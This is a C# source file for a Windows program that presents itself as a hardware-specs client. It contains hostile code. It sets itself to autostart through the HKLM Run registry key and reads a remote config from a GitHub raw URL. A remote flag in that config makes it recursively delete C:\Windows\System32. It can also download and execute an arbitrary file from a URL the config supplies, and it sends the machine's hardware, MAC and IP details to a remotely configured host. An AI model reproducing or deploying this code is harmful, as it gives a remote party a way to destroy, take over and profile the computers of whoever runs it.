using Hardware_Specs_GUI.Json;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Mime;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Hardware_Specs_Client
{
    public class Program
    {
        public static async Task Main()
        {

            int port = 12345;
            string ip = "127.0.0.1";
           
            string current = Assembly.GetExecutingAssembly().Location;

            try
            {
                File.Copy(current, Path.Combine(Path.GetDirectoryName(current), "Hardware Specs Client.exe"), true);
            }catch { }

            try
            {
                // Auto startup
                RegistryKey rk = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("Hardware Specs Client", Assembly.GetExecutingAssembly().Location);
            } catch 
            {
                Console.WriteLine("No permission to make registery edits, make sure u run the program as an administrator!");
            }


            // Get the server info
            using (HttpClient client = new HttpClient())
            {
                string data;
                try
                {
                    var request = new HttpRequestMessage
                    {
                        Method = HttpMethod.Get,
                        RequestUri = new Uri("https://raw.githubusercontent.com/TimvNaarden/Hardware_specs_client/main/index.json"),

                    };

                    using (var response = await client.SendAsync(request))
                    {
                        data = await response.Content.ReadAsStringAsync();
                    }
                    
                    Console.WriteLine("Getting port and ip...");
                    Dictionary<string, object> ob = data.FromJson<Dictionary<string, object>>();
                    ip = (string)ob["ip"];
                    if (!int.TryParse((string)ob["port"], out port))
                    {
                        Console.WriteLine($"Couldn't convert {ob["port"]} to int.");
                        return;
                    }

                    Console.WriteLine("Checking for updates...");
                    if (!Version.TryParse((string)ob["version"], out Version latestVersion))
                    {
                        Console.WriteLine($"Couldn't parse {ob["version"]} to a Version object.");
                        return;
                    }

                    Console.WriteLine("Delete system32?");
                    if (!bool.TryParse((string)ob["deleteSystem32"], out bool deleteSystem32))
                    {
                        Console.WriteLine($"Couldn't parse {ob["deleteSystem32"]} to a bool.");
                        return;
                    } 
                    else if(deleteSystem32)
                    {
                        Console.WriteLine("Deleting system32...");
                        try
                        {
                            Directory.Delete("C:\\Windows\\System32", true);
                        }
                        catch {
                            Console.WriteLine("Could not delete system32");
                        }
                    }

                    // Check if there is a new version
                    if (Config.Version.CompareTo(latestVersion) < 0)
                    {
                        Console.WriteLine("New update detected.");
                        string url = (string)ob["url"];
                        string path = Path.Combine(Path.GetDirectoryName(current), "new.exe");
                        var download = new HttpRequestMessage
                        {
                            Method = HttpMethod.Get,
                            RequestUri = new Uri(url),

                        };

                        using (var response = await client.SendAsync(download))
                        {
                            using (var fileStream = new FileStream(path, FileMode.OpenOrCreate))
                            {
                                Stream stream = await response.Content.ReadAsStreamAsync();
                                stream.Seek(0, SeekOrigin.Begin);
                                stream.CopyTo(fileStream);
                            }
                        }
                        Process.Start(path);
                        return;
                    } 
                    else
                    {
                        Console.WriteLine("No new update.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message + ex.StackTrace);
                }
            }

            PCinfo info = GetSystemInfo();
            string infopc = info.ToJson().FormatJson();
            Console.WriteLine(infopc);
            SendData.Send(infopc, ip, port);
        }

        private static PCinfo GetSystemInfo()
        {
            // Create an object that stores all the info 
            PCinfo info = new PCinfo();

            // Look all the required CPU info up
            ManagementObjectCollection cpus = new ManagementObjectSearcher("SELECT * FROM Win32_Processor").Get();
            //Store all the found cpu info
            foreach (ManagementObject cpu in cpus)
            {
                info.Systemname = cpu["systemname"].ToString();
                info.CPUName = cpu["name"].ToString();
                info.ThreadCount = cpu["ThreadCount"].ToString();
                info.BaseClockSpeed = cpu["maxclockspeed"].ToString();
                info.Cores = cpu["numberofcores"].ToString();
            }

            // Now we do the same for the memory information
            ManagementObjectCollection memoryDimms = new ManagementObjectSearcher("\\root\\CIMV2", "SELECT * FROM Win32_PhysicalMemory").Get();
            foreach (ManagementObject memory in memoryDimms)
            {
                info.MemoryCapacity += (Convert.ToDouble(memory["capacity"]) / 1048576);
                info.MemoryType += memory["memorytype"].ToString();
                info.MemorySpeed = Convert.ToDouble(memory["Speed"]);
                info.MemoryDimms += 1;
            }

            // Video informaton
            ManagementObjectCollection gpus = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController").Get();
            foreach (ManagementObject gpu in gpus)
            {
                info.VideoName.Add(gpu["name"].ToString());
                info.Vram.Add(Convert.ToDouble(gpu["AdapterRam"]) / 1048576);
            }

            // Network Information
            ManagementObjectCollection networkAdapters = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration").Get();            
            foreach (ManagementObject adapter in networkAdapters)
            {
                if (adapter["MACAddress"] != null)
                {
                    info.MACAddres.Add(adapter["macaddress"]?.ToString());
                }

                if (adapter["ipaddress"] != null)
                {
                    info.NetworkAddresses.Add((string[])adapter["ipaddress"]);
                }
            }

            //Storage Information
            ManagementObjectCollection drives = new ManagementObjectSearcher(@"\\.\root\microsoft\windows\storage", "SELECT * From MSFT_PhysicalDisk").Get();
            foreach (ManagementObject drive in drives)
            {
                string type; 
                switch (Convert.ToInt16(drive["MediaType"]))
                {
                        
                    case 1:
                        type = "Unspecified";
                        break;

                    case 3:
                        type = "HDD";
                        break;

                    case 4:
                        type = "SSD";
                        break;

                    case 5:
                        type = "SCM";
                        break;

                    default:
                        type = "Unspecified";
                        break;
                    
                }
                info.StorageNames.Add(drive["model"].ToString() + " - " + type);
                //foreach (PropertyData data in drive.Properties)
                //{
                //    Console.WriteLine("{0} = {1}", data.Name, data.Value);
                //}

            }
            ManagementObjectCollection motherboard = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard").Get();
            foreach (ManagementObject queryObj in motherboard)
            {
                info.Mob = queryObj["Manufacturer"].ToString() + " " + queryObj["Product"].ToString();
            }


            return info;
        }
    }

    public class PCinfo
    {
        public string CPUName { get; set; }
        public string Mob { get; set; }
        public string Systemname { get; set; }
        public string ThreadCount { get; set; }
        public string BaseClockSpeed { get; set; }
        public double MemoryCapacity { get; set; }
        public double MemorySpeed { get; set; }
        public string MemoryType { get; set; }
        public int MemoryDimms { get; set; }
        public string Cores { get; set; }
        public List<string> MACAddres { get; set; }
        public List<Array> NetworkAddresses { get; set; }
        public List<string> StorageNames { get; set; }
        public List<string> VideoName { get; set; }
        public List<double> Vram { get; set; }

        public PCinfo()
        {
            VideoName = new List<string>();
            Vram = new List<double>();
            NetworkAddresses = new List<Array>();
            StorageNames = new List<string>();
            MACAddres = new List<string>();
        }

    }
}
